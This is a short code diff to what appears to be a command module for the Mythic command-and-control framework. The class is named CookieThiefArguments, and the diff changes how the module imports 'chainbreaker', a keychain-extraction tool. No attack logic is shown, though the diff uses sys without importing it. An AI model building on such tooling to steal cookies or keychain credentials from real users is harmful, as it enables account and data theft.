@@ -1,8 +1,9 @@
 from mythic_payloadtype_container.MythicCommandBase import *
 import json
 import os
-from ..chainbreaker import chainbreaker
 from mythic_payloadtype_container.MythicRPC import *
+sys.path.append('../chainbreaker')
+import chainbreaker
 
 
 class CookieThiefArguments(TaskArguments):
